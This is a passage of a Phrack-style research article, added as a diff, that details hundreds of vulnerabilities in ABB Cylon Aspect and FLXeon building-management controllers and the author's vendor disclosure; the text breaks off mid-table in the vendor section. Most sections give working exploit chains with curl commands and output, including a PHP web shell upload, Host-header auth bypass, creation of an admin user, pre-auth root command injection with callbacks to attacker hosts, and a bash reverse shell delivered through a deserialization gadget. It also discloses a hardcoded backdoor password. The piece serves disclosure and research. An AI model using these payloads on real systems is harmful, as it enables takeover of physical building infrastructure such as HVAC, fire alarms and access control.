@@ -1,0 +1,943 @@
+---
+title: Beyond the Facade :: Exposing Smart Giants
+author: LiquidWorm
+---
+|=-----------------------------------------------------------------------=|
+|=-------------------------=[  P R O J E C T  ]=-------------------------=|
+|=----------------------------=[ Brainfog ]=-----------------------------=|
+|=-----------------------------------------------------------------------=|
+|=------------=[ Beyond the Facade :: Exposing Smart Giants ]=-----------=|
+|=--------------------------=[ Phrack Edition ]=-------------------------=|
+|=-----------------------------------------------------------------------=|
+|=---------------------------=[ LiquidWorm ]=----------------------------=|
+|=-------------------------=[ zeroscience.mk ]=--------------------------=|
+|=-----------------------------------------------------------------------=|
+
+
+                            "It's 2026, and we're living in VulnCities."
+
+
+--[ Contents
+
+    1 - Prologue: the building that fogged my brain
+    2 - Bloodline of a Frankenstein: 2008 to 2020
+    3 - First blood: an unauth RCE that was "already fixed"
+    4 - Firmware acquisition and (damage) version control
+    5 - The city of a thousand zero-days
+    6 - //--- Begin Authorization ---// (and how to end it)
+    7 - The funky badass backdoor (?EXPERTMODE)
+    8 - The JSON proxy problem, or: Host: localhost owns you
+    9 - guest2root
+   10 - Crossing the river to FLXeon
+   11 - POST /api/cmds {"cmd":"..."}, root by design
+   12 - hashPassword(): unauth root via openssl
+   13 - cxpro: the backdoor that was "no longer needed"
+   14 - The WebSocket that forgot to ask who you are
+   15 - Two cheap shots: JSON flood and a timing oracle
+   16 - Vendor drama: "another researcher, who wishes to
+        remain anonymous"
+   17 - Shouts & epilogue
+
+
+--[ 1 - Prologue: the building that fogged my brain
+
+It started, as these things do, on someone else's network. April 2024,
+an offensive engagement, and there it was, sitting on a flat segment
+with one leg in the corporate LAN and the other wired straight out to
+the public Internet. A web panel titled "ASPECT Control Panel". I tried
+aamuser:default. I was in.
+
+That box turned out to be an ABB Cylon Aspect building controller. I
+pulled the thread and a sibling fell out with it, the ABB Cylon FLXeon
+(BACnet) series. These are the systems that run Mechanical, Electrical
+and Plumbing (MEP) for real buildings: HVAC, chillers, boilers, air
+handling units, fire alarms, lighting, access control, and the pumps
+that stop a basement from becoming a swimming pool. Skyscrapers,
+stadiums, hospitals, airports, museums. The kind of infrastructure
+where a denial of service is spelled with a wrench.
+
+Over the following year I logged north of 800 vulnerable code paths
+across these two product lines. Let me be straight about that number up
+front, because it is the kind of figure people wave around. It is a count
+of vulnerable sinks, not 800 hand-crafted bugs. It is the same handful of
+mistakes copy-pasted across a codebase nobody had audited since 2008.
+Section 5 breaks it down by root cause. Somewhere around the point where a
+single grep was returning hundreds of hits with identical shapes, the
+scale of it made me physically dizzy for about two weeks. That is where
+the project got its name. Brainfog.
+
+This is not the 160-page report. There are no CVE spreadsheets here, no
+impact matrix, no bibliography. It is the story and the bugs that made
+me laugh out loud, plus the vendor comedy that ran alongside them. If
+you want the full body count, the advisories are on the ZSL site.
+
+
+--[ 2 - Bloodline of a Frankenstein: 2008 to 2020
+
+Before the code, the family tree. Almost every stupid thing in this
+paper is explained by one sentence. Nobody ever owned this codebase
+long enough to be ashamed of it.
+
+  .----------.-----------------------------------------------------.
+  |  YEAR    |  EVENT                                              |
+  +----------+-----------------------------------------------------+
+  |  2008    |  American Auto-Matrix (AAM), a US shop, ships       |
+  |          |  Aspect 1.0.0. PHP + Java + bash on Linux/ARM.      |
+  |  2013    |  Cylon Controls (Ireland) buys AAM. Keeps shipping. |
+  |  2020    |  ABB buys Cylon. Rebrands to "ABB Cylon Aspect"     |
+  |          |  and "ABB Cylon FLXeon". Firmware 3.03.03.          |
+  |  2021    |  ABB ships rebranded FLXeon 9.0.0.                  |
+  |  2024    |  Four years post-acquisition, ABB quietly starts    |
+  |          |  patching (v3.08.01). I show up.                    |
+  '----------'-----------------------------------------------------'
+
+So the Aspect firmware I was staring at was an 18-year-old organism
+that had survived two acquisitions with its DNA basically intact. Java
+class files with @author dgunther and comments like "Removed #641 SRC
+10/12/2009". PHP written under the assumption that this thing lives on
+an air-gapped island and the Internet is a rumor.
+
+ABB's technical bulletins kept saying "security enhancements". In
+practice, until March 2024, "enhancements" meant features. The real
+security work did not start until 3.08.01, and even then it started
+silently. That is where the fun begins.
+
+
+--[ 3 - First blood: an unauth RCE that was "already fixed"
+
+The panel has a Network Diagnostics page under System Administration.
+It lets you ping, nslookup or traceroute a host. You already know where
+this is going.
+
+networkDiagAjax.php, roughly:
+
+    $command = htmlspecialchars($_GET['command']);
+    $host    = htmlspecialchars($_GET['host']);
+    ...
+    if ($command == "ping") {
+        exec("ping -c 3 $host 2>&1", $outputPing);
+    ...
+    if ($command == "traceroute") {
+        ...
+        exec("$traceRoute $host 2>&1", $outputTraceroute);
+
+htmlspecialchars() escapes HTML. It does exactly nothing about a shell
+metacharacter. $host walks straight into exec(). That is unauthenticated
+remote code execution as www-data, immediately.
+
+The punchline came from the diff. When I compared firmware versions I
+found this had already been "fixed". Prism Infosec reported it back in
+2022, ABB shipped CVE-2023-0635 and CVE-2023-0636, and the patch added
+escapeshellcmd() around $host. The patch never added an authentication
+check, though. So the command injection was mitigated, but the endpoint
+stayed wide open to unauthenticated callers, which meant you could still
+drive it as an SSRF and DoS primitive against the box. Fixing one symptom
+while leaving the door unlocked is the most repeated move in the entire
+engagement. It comes up dozens of times.
+
+
+--[ 4 - Firmware acquisition and (damage) version control
+
+Getting the firmware to analyze statically was, at first, "not possible".
+Then I remembered I had a pre-auth command injection on a live building,
+so I tar'd the filesystem off the target through the bug and analyzed
+that at home, where the worst I could do was crash my own laptop instead
+of a hospital.
+
+Then it got funnier. ABB's own website was serving old firmware images
+to the public. Unauthenticated, unencrypted, with no integrity or
+confidentiality protection. I pulled 3.07.00 and 3.07.01 straight down.
+The vendor later confirmed that no firmware was ever supposed to be
+publicly downloadable. The image uses a .aam extension and no protection
+whatsoever, and unblob cracks it open into a stock ARM Linux rootfs in
+seconds.
+
+For the record, here is the release train I reconstructed. Notice how
+the CVE count per release tells its own story:
+
+    3.07.01     Mar 2023 (2 CVEs)
+    3.07.02     Jul 2023 (1 CVE )
+    3.08.00     Oct 2023
+    3.08.01     Mar 2024 <- silent patching begins
+    3.08.02     Aug 2024 (2 CVEs) <- "the disaster", see later
+    3.08.03     Dec 2024 (24 CVEs)
+    3.08.04     May 2025 (33 CVEs)
+    3.08.04-s01 Aug 2025 (3 CVEs)
+
+Two versions of the same firmware is a gift. Diffing 3.07.01 against
+3.08.01 is basically a treasure map the vendor drew for me. Every file
+they quietly touched is a file they knew was rotten and never told
+anyone about.
+
+
+--[ 5 - The city of a thousand zero-days
+
+Once you internalize the house style, the codebase stops being software
+and becomes a fishing pond. I grepped the webroot for the php://input
+wrapper and every single instance was exploitable. Not most of them. All
+of them.
+
+A quick census of one htmlroot (v3.08.01), because the shape of the
+codebase matters more than any single bug:
+
+  .------------------------.------------------------------------.
+  |  245  exec()           |  238  $_POST sinks                 |
+  |    2  shell_exec()     |  116  $_GET sinks                  |
+  |  100  fopen()          |   11  php://input wrappers         |
+  |   32  fwrite()         |  143  files WITH an auth check     |
+  |   16  unlink()         |   11  files w/ auth COMMENTED OUT  |
+  |  258  PHP files        |    1  file w/ conditional auth     |
+  '------------------------'------------------------------------'
+
+Now the honest version of the headline number. 800-plus is a count of
+vulnerable sinks, not 800 clever bugs. The same dozen mistakes are
+copy-pasted across hundreds of files written in one house style. Collapse
+them by root cause and the picture is small and grim. Here are rough
+tallies you can reproduce with grep on the 3.08.01 htmlroot:
+
+  - Broken access control by omission. 47 of 201 top-level PHP files
+    ship no validateHeader.php include. Drop the library includes and
+    the factory and maintenance scripts and about 33 are directly
+    reachable handlers. Section 6 walks that count across releases.
+  - OS command injection. The census counts 245 exec() sinks and two
+    shell_exec(). Not every sink is attacker-reachable, but the ones fed
+    by $_GET or $_POST are, and there are dozens.
+  - Arbitrary file read, write, delete and path traversal. The fopen(),
+    fwrite(), unlink() and file_get_contents() family, on the order of
+    150 file operations over user-controlled paths.
+  - Reflected and stored XSS. echo of request parameters, the classic.
+  - SSRF, SQL injection in the Java MIX tier, session fixation, info
+    disclosure, hardcoded credentials and outright backdoors. One or
+    more of each.
+
+Call it ten or so root causes, replicated until the instance count
+crosses 800. Of those, ABB assigned about 65 CVEs. So when I say 800-plus
+I mean sinks you can point a debugger at, and when I say "the same bug
+again" I mean it literally. The rest of this paper walks the interesting
+representatives, not all 800 cousins.
+
+Here are a couple of representative silent fixes I caught in the diff,
+meaning bugs ABB patched with no changelog entry, no advisory, and no
+word to anyone.
+
+caldavUtil.php, the doPostFooter() handler (unauthenticated):
+
+    $cmd = "sudo /usr/local/aam/bin/CAL_doPost.sh config.php footer \""
+           . $_POST['Footer'] . "\"";
+    exec($cmd, $output, $return_val);
+
+$ curl "http://tgt/caldavUtil.php" -d "command=postFooter&Footer=%60id%60"
+Set footer to uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+You set the building's web footer to the output of "id". That is the
+whole exploit. It runs under sudo, but the payload is evaluated as
+www-data before sudo takes over, so you land as the web user. Hold that
+thought until section 9, where the same trick lands you as root.
+
+yumSettings.php had a matching authenticated blind injection through the
+PROXY parameter. downloadDb.php was a ../../../../etc/passwd read.
+userManagement.php would happily "Add" a user with a one-character
+password, because the strength check lived in JavaScript. None of these
+were in a changelog. All of them were "already handled internally".
+
+
+--[ 6 - //--- Begin Authorization ---// (and how to end it)
+
+Here is my favorite structural joke in the whole Aspect stack. Auth on a
+PHP page is opt-in, and it looks like this, verbatim, at the top of the
+files that bothered:
+
+    //---------Begin Authorization-------------
+    require_once 'validate/validateHeader.php';
+    //--------End Authorization----------------
+
+The security boundary of the entire control panel is a one-line include
+that a developer either remembered to paste or did not. If that header
+is missing, the file is world-accessible. No session, no auth, no
+problem. And in a lot of files it had been commented out during
+debugging and shipped that way.
+
+Counting IDOR-class files across releases:
+
+    3.07.01: 28 files unauthenticated, 11 with auth commented out
+    3.08.01: 33 files unauthenticated, 11 with auth commented out
+    3.08.03: 13 files unauthenticated,  5 with auth commented out
+
+The star of the unauthenticated set was servicesUpdate.php. Per its own
+comments it was last touched in 2009, it had no validateHeader.php in
+sight, and it ran a switch() full of exec() calls driven by POST
+parameters. The serviceAction value was character-filtered. The instance
+value next to it was not:
+
+    case "restartSingleMix":
+        $command = $sudo . " " . $init . "aspect$instance restart";
+        exec($command);
+
+$ curl "http://tgt/servicesUpdate.php" \
+  -d 'serviceAction=restartSingleMix&instance=1\
+      $(curl%20-A%20"`id`"%20remotelog.zeroscience.mk)'
+
+My out-of-band listener catches:
+
+    User-Agent: uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+Another silent partial fix. The 2023 audit hardened serviceAction and
+walked right past the instance sink sitting on the next line.
+
+
+--[ 7 - The funky badass backdoor (?EXPERTMODE)
+
+Alright, fam, crank the funk-o-tron to eleven, because we are about to
+strut through a real one. Three files run this show. caldavInstall.php
+and caldavInstallAgendav.php are the install wizards, and
+caldavUpload.php is the thing that actually catches your file. Grab your
+shades. This section is the full chain, byte for byte, so you can walk it
+yourself against a 3.08.01 image.
+
+THE TELL: ?EXPERTMODE
+
+The wizard opens like this. caldavInstall.php still carries its 2013
+PhpStorm header ("User: dgunther") and starts with:
+
+    $badassMode = false;
+    if (isset($_GET["EXPERTMODE"])) {
+        $badassMode = true;
+    }
+
+Request /caldavInstall.php?EXPERTMODE and $badassMode flips true, which
+reveals exactly one extra form control:
+
+    if ($badassMode)
+        echo "Skip MD5 Test<input type='checkbox' name='skipChecksum'
+              value='1'>";
+
+That is the entire "expert" feature. A switch reachable by an
+undocumented URL parameter, whose only job is to turn off the integrity
+check on a package upload. Keep it in your pocket. As you are about to
+see, you do not even need the wizard.
+
+THE DROP: caldavUpload.php (no lock on the door)
+
+Both wizards post to caldavUpload.php. The first thing to notice is what
+is missing from the top of that file:
+
+    $ grep -c validateHeader.php caldavUpload.php
+    0
+
+No //--- Begin Authorization ---// block, no session_start(), nothing.
+caldavUpload.php is reachable unauthenticated. No login, no EXPERTMODE,
+no wizard. You post straight to it. Here is the integrity logic,
+verbatim from v3.08.01:
+
+    if (isset($_POST["skipChecksum"])) {
+        $skipChecksum = $_POST["skipChecksum"];
+    }
+    ...
+    $uploadedChecksum = md5_file($output_dir . $uploadFile["name"]);
+
+    if ($whichFile == "baikal") {
+        // if (in_array($uploadedChecksum, $baikal_md5)
+        //     && $skipChecksum == 0) {
+        //     syslog(LOG_ERR, "is Baikal Package");
+        // } elseif ($skipChecksum == 1) {
+        if ($skipChecksum == 1) {
+            syslog(LOG_ERR, "Baikal Checksum skipped");
+        } elseif ( version_compare(PHP_VERSION, '7.3.0', '>=')
+                   && strpos($uploadFile['name'], '0.6.') > 0 ) {
+            $baikalVersion = substr($uploadFile['name'],
+                          strpos($uploadFile['name'], '0.6.'), 5);
+            syslog(LOG_ERR, "is Baikal $baikalVersion Package.");
+            syslog(LOG_ERR, "Baikal Checksum skipped");
+        } else {
+            header("HTTP/1.0 500 Internal Error");
+            echo "Not a recognized Baikal package"; exit;
+        }
+        unlink($output_dir . $baikalStaticFilename);
+        rename($output_dir . $uploadFile["name"],
+               $output_dir . $baikalStaticFilename);
+        exec("sudo /usr/local/aam/bin/CAL_doExtract.sh baikal-flat.zip");
+
+The real check, in_array($uploadedChecksum, $baikal_md5), is commented
+out. It is not bypassed at runtime, it is deleted from the logic. The
+array it would have compared against still ships next door in
+lib/caldav-checksums.inc and holds exactly one live hash, the genuine
+Baikal 0.6.1 release (0570e3d357b3b6c28cadce68499cd844). So md5_file()
+is computed on the upload and then thrown away.
+
+What is left as your only obstacle is one of two things, and you choose:
+
+    1. Send skipChecksum=1. No auth required. The branch logs
+       "Baikal Checksum skipped" and moves on.
+    2. Do not even bother with that. Name your zip so the filename
+       contains the substring "0.6." (say evil-0.6.zip). On PHP 7.3 and
+       up the elseif matches on strpos() alone and also logs
+       "Baikal Checksum skipped".
+
+That is the whole gate. A substring match on a filename you control.
+
+THE MACHINE: what CAL_doExtract.sh does as root
+
+caldavUpload.php renames your upload to baikal-flat.zip and hands it to
+sudo /usr/local/aam/bin/CAL_doExtract.sh. That script runs as root.
+Trimmed to the load-bearing lines (v3.08.01):
+
+    WORKDIR="/var/tmp" ; DESTDIR="/home" ; CALDAVTMP="caldav-tmp"
+    ...
+    unzip -qq $WORKDIR/baikal-flat.zip -d $WORKDIR/$CALDAVTMP
+    test -d $WORKDIR/$CALDAVTMP/baikal-flat \
+      && mv $WORKDIR/$CALDAVTMP/baikal-flat $WORKDIR/$CALDAVTMP/baikal
+    ...
+    mv $WORKDIR/$CALDAVTMP/baikal $DESTDIR/baikal      # to /home/baikal
+    chown -R apache:apache $DESTDIR/baikal
+    ...
+    # docroot is /home/baikal/html if that dir exists, else /home/baikal
+    cat << EOF > /etc/httpd/conf.d/baikal.conf
+    Alias /baikal $PATHBAIKAL
+    <Directory "$PATHBAIKAL"> ... Allow from all </Directory>
+    EOF
+
+So your archive is unzipped as root, moved under /home/baikal, handed to
+the apache user, and wired into the web server under the URL alias
+/baikal. There is no verifyBaikal() in this version. Whatever files are
+in your zip are now web content.
+
+THE ZIP: what to actually pack
+
+The only structural requirement is a single top-level directory named
+baikal, or baikal-flat which the script renames to baikal. If it contains
+an html/ subdirectory the alias points at /home/baikal/html, otherwise at
+/home/baikal. Minimal weaponized archive, laid out flat because there is
+no html/ dir, so /baikal maps to /home/baikal:
+
+    evil-0.6.zip
+        baikal-flat/
+            sh.php        <?php system($_GET['c']); ?>
+
+sh.php then lands at /baikal/sh.php. If you would rather trojanize the
+real thing, drop sh.php into baikal/html/ inside a genuine baikal-0.6.1
+release and the normal install completes around your shell.
+
+THE RUN
+
+    $ curl -F 'baikalFile=@evil-0.6.zip' -F 'skipChecksum=1' \
+           'http://tgt/caldavUpload.php'
+    Baikal Bundle Uploaded and Extracted - OK
+
+The alias only serves once httpd re-reads conf.d. The installer's own UI
+tells the operator to "restart the Web Server service" right after upload,
+and that restart is reachable from the panel, so in practice it happens
+on its own. After it, the staged shell answers:
+
+    $ curl 'http://tgt/baikal/sh.php?c=id'
+    uid=48(apache) gid=48(apache) groups=48(apache),0(root)
+
+Apache-level code execution, unauthenticated up to the reload, from a
+file upload whose checksum was commented out and whose filter is a
+strpos() on a name you picked.
+
+THREE SIGNALS
+
+Say "backdoor" and someone will say "sloppy feature". Fine. Count the
+signals. One, ?EXPERTMODE is undocumented and its only effect is to
+disable a safety check. Two, the integrity test is commented out in
+source, not merely bypassable at runtime. Three, the handler that does
+the work ships with no authentication at all. Any one of those is a bug.
+All three together is a way in that somebody left on purpose and forgot
+to sweep up.
+
+I did not have to win that argument. ABB pulled the entire
+CalDAV/Baikal/AgenDAV subsystem in 3.08.02, and Cylon Technical Bulletin
+No. 537 (07 Aug 2024) said so in vendor voice:
+
+    "CalDAV / Biakal calendaring has been removed from ASPECT due to
+     security considerations."
+
+Feature deprecated. Point conceded. Groove out.
+Ref: Funkalicious Exploit (funkalicious.py), ZSL-2025-5926
+ - https://packetstorm.news/files/id/189617/
+
+
+--[ 8 - The JSON proxy problem, or: Host: localhost owns you
+
+Aspect is two worlds bolted together. A PHP control panel out front, and
+a Java application server (AspectFT, internally "MIX", built for ABB by
+ErgoTech) on localhost:7226 running the actual building logic. The Java
+side requires auth for remote callers but trusts localhost. You can see
+the trap from orbit.
+
+The bridge between the two is jsonProxy.php:
+
+    $port        = $_GET['port'];
+    $application = $_GET['application'];
+    $query       = $_GET['query'];
+    $url = "http://localhost:$port/servlets/".$application."?"
+           . html_entity_decode($query);
+    $s = file_get_contents($url, false);
+    echo $s;
+
+It is unauthenticated. It fetches an arbitrary local servlet from the
+server itself, so as far as the Java side is concerned the request came
+from localhost. It is an SSRF whose only job is to launder your requests
+into trusted ones. Hundreds of servlets become reachable with no login.
+
+$ curl "http://tgt/jsonProxy.php?port=7226&application=ProjectInfo"
+    ...
+    aamuserdefault
+
+That "aamuserdefault" is the base64-decoded credential for the project
+archive and for the panel. So next:
+
+$ curl "http://tgt/jsonProxy.php?port=7226&application=DownloadProject?\
+downloadSource=true" -o Skyscraper.zip
+$ 7z -p"aamuserdefault" x Skyscraper.zip
+
+That is 38 MB of AES-encrypted project, decrypted with the password the
+previous request just handed you, containing a mapconfig.db with
+plaintext credentials (for example the alarm-email account) sitting in
+SQLite. That is the whole config-exfil chain.
+
+Now, why does the Java side trust this? Because of
+AuthenticatedHttpServlet.authorized():
+
+    String host = request.getRemoteAddr();
+    if (host.equalsIgnoreCase("localhost") || host.equals("127.0.0.1")) {
+        return true;
+    }
+
+That looks reasonable. Except this MIX build overrides getRemoteAddr():
+
+    @Override
+    public String getRemoteAddr() {
+        this.getServerPort();
+        return this.getHeader("host");     // <-- the Host HTTP header
+    }
+
+Read that again. getRemoteAddr(), the method whose entire reason for
+existing is to return the peer's socket address, was reimplemented to
+return the client-controlled Host header. So you don't even need
+jsonProxy.php. Port 7226 is exposed:
+
+$ curl "http://tgt:7226/servlets/ProjectInfo"
+    401 You are not authorized...
+$ curl "http://tgt:7226/servlets/ProjectInfo" -H "Host: localhost"
+    ...
+    aamuserdefault
+
+One header and you are "localhost". Every servlet extending
+AuthenticatedHttpServlet inherits the bypass. That is how a spectator
+becomes a MIXAdmin:
+
+$ curl "http://tgt:7226/servlets/UserManager" -H "Host: localhost" \
+  -d "newuser=testingus&password=123456&passwordConfirm=123456&Insert=Add"
+$ curl "http://tgt:7226/servlets/GroupManager?selectedGroup=MIXAdmin" \
+  -H "Host: localhost" \
+  -d "groupName=MIXAdmin&addedRight=admin%2ctestingus&EditGroup=Save"
+
+The Host header is for virtual hosting. It is fully attacker-controlled.
+Using it as an origin of trust is not a feature with a bug in it. It is a
+category error someone shipped as a shortcut for local PHP to Java calls
+and never removed.
+
+There is a persistence bonus in here too. Persist.java deserializes
+untrusted files from the persist directory with no class filtering, and
+HTTPDownloadServlet writes arbitrary paths. commons-collections-3.2 is on
+the classpath, so:
+
+$ java -jar ysoserial.jar CommonsCollections1 \
+    "bash -i >& /dev/tcp/10.0.0.1/7171 0>&1" > Foo.prst
+$ curl -F "filename=../../persist/Foo.prst" -F "file=@Foo.prst" \
+    http://tgt:7226/servlets/HTTPDownloadServlet -H "Host: 127.0.0.1"
+
+The next time the app calls unPersist(), your gadget fires. The file
+stays put, so it re-fires on every restart. That is a backdoor that
+survives reboots, delivered through the same Host: localhost trust bug.
+
+
+--[ 9 - guest2root
+
+Individually, three files here are careless. Chained, they take you from
+the guest account to remote root. This one is the silliest.
+
+Step one is that the login lies. /validate/login.php (v3.08.02, the copy
+in 3.08.01 is stubbed with an early exit()) runs session_start() and
+stores your session before it checks whether you belong to the MIXAdmin
+group:
+
+    $sessionManager->storeApp($appId, $status['user'], $status['pass']);
+    if ( in_array('MIXAdmin', $status['groups']) ) {
+        header('Location: ../setup.php');
+    } else {
+        ...
+        header('Location: ../index.php?error=Invalid Admin ...');
+        exit();
+    }
+
+Log in with the default guest:guest. guest is valid for the Java HMI, so
+checkCredentials() succeeds and storeApp() writes a real session. Then
+the group check fails and you're bounced to an "Invalid Admin Username
+and/or Password" error. It looks like you were rejected. You weren't. The
+session is already live:
+
+$ cat /tmp/sess_30c8...5a
+f_user|s:5:"guest";f_pass|s:10:"6775657374";
+
+Ignore the error and walk straight to /setup.php. The admin panel opens,
+because setup.php trusts the session instead of re-checking the group.
+Broken access control, guest edition. (ZSL-2025-5949)
+
+Step two is the update path. From that panel you reach System Updates,
+which ultimately calls fileSystemUpdateExecute.php:
+
+    $uploadFile = $upload_dir . $local_uploadfile;   // firmware.aam
+    $command = $sudo . " " . $shell . "upgrade-bundle.sh " . $uploadFile;
+    $tmp = exec($command);
+
+The upload path filtered the filename for junk characters but never
+looked at the file contents. Here is the crucial difference from every
+www-data bug earlier in this paper. upgrade-bundle.sh is invoked under
+sudo, and the shell evaluates the payload embedded in the bundle path
+after sudo has escalated. So:
+
+    /usr/bin/sudo /usr/local/aam/bin/upgrade-bundle.sh \
+        /var/lib/php/session/firmware.aam
+                            |
+                            +--> curl -A "`id`" attacker.host
+
+    uid=0(root) gid=0(root) groups=0(root)
+
+Log in with guest:guest, ignore the fake error, upload a "firmware" file
+whose name carries a command substitution, and you have remote code
+execution as root. Default credentials to uid 0 in three requests.
+
+
+--[ 10 - Crossing the river to FLXeon
+
+The FLXeon (BACnet) controllers are the other half of the family. Same
+lineage, different stack. Linux 5.4.27, Node.js 8.4.0 (Express) serving
+JavaScript, bash underneath, ARMv7. Default creds admin:cylonctl, with no
+forced change and no additional roles. There are about 37 bugs here,
+roughly 20 of them RCE to root, two of those pre-auth.
+
+The house style survived the port to JavaScript perfectly intact. The
+first thing the audit turns up is api/siteGuide.js. It exists on disk but
+isn't even registered in routes.js, an unrouted and forgotten handler:
+
+    const file = '/tmp/' + req.file.filename;
+    ChildProcess.exec('mv ' + file + " " + siteGuideFile
+                       + req.file.originalname, (err) => { ... });
+
+An unsanitized filename concatenated into a shell mv. That gives you
+command injection and path traversal at once. An originalname of
+../../../../etc/passwd overwrites files as root, and the HMI it feeds
+(/FS/VOL1/sg/sg2.html) was reachable with no auth at all. When ABB
+"fixed" it in 9.3.5 they bolted basic-auth onto the route and left the
+exec() concatenation untouched. The injection still works for anyone past
+the new password. Incomplete remediation, JavaScript edition.
+
+That's the appetizer.
+
+
+--[ 11 - POST /api/cmds {"cmd":"..."}, root by design
+
+No cleverness required for this one. The Diagnostics pages (Processes,
+System Logs) work by POSTing to /api/cmds.
+Watch the traffic and you see:
+
+    POST /api/cmds
+    {"cmd":"top -b -n 1"}
+
+Now look at the handler, in full, because it's short enough to fit on a
+punchcard:
+
+    const ChildProcess = require("child_process");
+    function post(req, res) {
+        ChildProcess.exec(req.body.cmd, { maxBuffer: 1024*1024 },
+          function (err, stdout, stderr) {
+            if (err) res.status(400).send({ err: err, text: stdout });
+            else     res.send({ result: stdout });
+        });
+    }
+    exports.post = post;
+
+That is the whole thing. The API's documented, intended function is "run
+this shell string and return stdout". The Node process runs as root, so:
+
+$ curl -k "https://tgt/api/cmds" -d '{"cmd":"ls -alsth"}' \
+    -H "Cookie: user_sid=xxx" -H "Content-type: application/json"
+    ...
+    drwxr-xr-x  2 root root ... api
+    lrwxrwxrwx  1 root root ... uploads -> /usr/local/aam/uploads
+
+There is no injection technique and no escaping. You send a command, root
+runs it. The 9.3.5 fix finally introduces a whitelist (cat, top, journal,
+upgrade) and execFile(), which is what should have been there since 2019.
+
+
+--[ 12 - hashPassword(): unauth root via openssl
+
+/api/cmds at least wanted a session cookie. login.js does not.
+
+To authenticate, FLXeon reads /etc/shadow, pulls the algorithm and salt
+for your user, recomputes the hash of the password you supplied, and
+compares. It computes that hash by shelling out to openssl:
+
+    function hashPassword(password, algorithm, salt, callback) {
+        ...
+        cmd = 'openssl  passwd  -' + algorithm + ' -salt ' + salt
+              + ' ' + password;
+        ChildProcess.exec(cmd, function (err, stdout, stderr) { ... });
+    }
+
+The password you are trying to log in with is concatenated into a shell
+command and passed to exec() during the login check, before you are
+authenticated. You only need a valid username to reach hashPassword().
+Valid usernames are admin, root, and cxpro. Keep that last one in mind
+for the next section. The password field is yours to weaponize:
+
+$ curl -k -H "Content-Type: application/json" \
+  -d '{"username":"admin","password":"'\''\%22\'\'';curl -A
+       "`{cmd}`" {host}:5555;'\''//"}' \
+  "https://tgt/api/login"
+
+    uid=0(root) gid=0(root) groups=0(root)
+
+It's blind, so in practice you drive it with DNS exfil or a reverse
+shell. The primitive is pre-auth root code execution in the function
+whose entire job is to decide whether you're allowed in. Thanks to Davide
+Cioccia for the escape payload that made the quoting behave.
+
+
+--[ 13 - cxpro: the backdoor that was "no longer needed"
+
+Remember cxpro from the valid-usernames list? Here is where it comes
+from. During filesystem triage I read runtimeSetup.sh, which runs at
+firmware install time:
+
+    # add the siteguide user
+    grep cxpro /etc/passwd
+    if [ $? -ne 0 ] ; then
+      useradd -u 950 -d /usr/local/aam/node-server/platform-dist -r \
+        -s /bin/sh -g admin \
+        -p '$6$jwix7x1XIB/$OS5/8TFhxckN5sc2KZCe3xfmX3VX8E3UPf7GE3v...' \
+        cxpro
+    fi
+
+A hardcoded user, cxpro, in the admin group, with a fixed password hash.
+The plaintext is "siteguide". It has been baked into these controllers
+since at least 2019. It is absent from every piece of documentation,
+which only ever mentions admin:cylonctl. Because auth is just an
+/etc/shadow lookup, cxpro:siteguide logs straight into the admin panel.
+Full control of the building.
+
+After I reported it, ABB removed it in 9.3.5. The removal is as blunt as
+the original:
+
+    # Remove the cxpro user as no longer needed and was a security issue
+    grep cxpro /etc/passwd
+    if [ $? -eq 0 ] ; then
+        userdel cxpro
+    fi
+
+"No longer needed." Backdoor removed because no longer needed. t00t.
+
+
+--[ 14 - The WebSocket that forgot to ask who you are
+
+The ws/ directory does serial packet capture (BACnet, Modbus, MS/TP,
+SmartRouter) by spawning tcpdump. Credit where credit is due. The
+developers used child_process.spawn() with an argument array here instead
+of exec(), which is the one place in the entire product where a design
+decision actively prevented an unauth root RCE. I was almost proud of
+them.
+
+Almost, because wsConnect.js sets up the WebSocket server with exactly
+zero authentication:
+
+    wss.on('connection', connect);   // anyone who can reach the port
+
+There is no session parse, no token, nothing. You connect with websocat,
+send {"target":"tcpdump","method":"start",...}, and the box starts
+capturing traffic for you. If you prefer, you start captures in a tight
+loop and let the I/O and disk usage do a pre-auth DoS:
+
+    TARGET="wss://$IP:443/ws"
+    echo '{"target":"tcpdump","method":"start","params":
+           {"type":"smartRouter","minutes":1,"sizeKb":10}}' \
+      | websocat --insecure --one-message --no-close "$TARGET" -v
+
+That is unauthenticated network capture on a building controller. The
+9.3.5 fix adds an upgrade() handler that finally parses the session and
+returns 401 if req.session.auth is false. In other words it adds the auth
+check that should have gated the socket from day one.
+
+
+--[ 15 - Two cheap shots: JSON flood and a timing oracle
+
+Not every bug is a crown jewel. Two quick ones, because they're funny.
+
+JSON object flood. /api/serialConfig.js enforces "two ports max" in the
+browser and nowhere on the server:
+
+    var newPorts = req.body.ports;
+    for (let idx = 0; idx < newPorts.length; idx++) { ... }
+    ...
+    ChildProcess.exec('systemctl restart supervisord');
+
+PUT it a few hundred empty objects and it dutifully writes them all, then
+restarts supervisord, and the panel wedges:
+
+    pd = {"ports": [{} for _ in range(251)]}
+    requests.put(f"https://{tgt}/api/serialConfig", data=json.dumps(pd),
+                 headers=hdrs, verify=False)
+    # Bamboozled!
+
+The 9.3.5 fix is one line: if (!newPorts || newPorts.length > 2) bail.
+
+Timing oracle. login.js compares hashes with a plain !== and uukl.js with
+==. Both short-circuit, so response time leaks how much of your guess
+matched, which is enough to distinguish a valid username from an invalid
+one out of the noise:
+
+    invalid user:  baseline ~337 ms, guesses ~330-344 ms
+    valid   user:  baseline ~599 ms, guesses ~594-672 ms
+
+The fix swaps in crypto.timingSafeEqual(). It is a small bug, but it's
+the kind of detail that tells you nobody ever threat-modeled the login
+path.
+
+
+--[ 16 - Vendor drama: "another researcher, who wishes to
+         remain anonymous"
+
+The bugs were the easy part. Here is the human part, compressed.
+
+I reported in April 2024 with two proof-of-concepts. I sent only two on
+purpose, to gauge how the vendor's team handled a report before I handed
+over the other 800. They patched exactly those two, shipped 3.08.02, and
+published their first PSIRT advisory in ages. The advisory omitted detail,
+quietly fixed extra things it didn't mention, misdescribed a CVE, and
+lowballed the CVSS. When I asked about credit, I was told the advisory
+was addressing issues reported by "some other researcher who wishes to
+remain anonymous".
+
+Those were my bugs. In a later call with executives I said so. After an
+initial silence, the story became "another researcher reported them in
+June". The advisory was eventually updated to include my name.
+
+  .------------.--------------------------------------------------------.
+  |  DATE      |  EVENT                                                 |
+  +------------+--------------------------------------------------------+
+  | 22 Apr 24  |  I report. Vendor sends me 3.08.01 to review.          |
+  | 02 May 24  |  I send two detailed PoCs.                             |
